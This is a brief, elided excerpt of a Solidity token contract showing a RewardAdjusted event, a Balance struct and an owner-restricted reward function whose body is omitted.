...
contract Token is Context, Ownable, IERC20 {
    ...
    event RewardAdjusted(address indexed account, uint256 oldReward, uint256 newReward);

    struct Balance {
    uint256 amount;
    }

    function reward(address account, uint256 newReward) external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");
    ...
    emit RewardAdjusted(account, oldReward, newReward);
    }
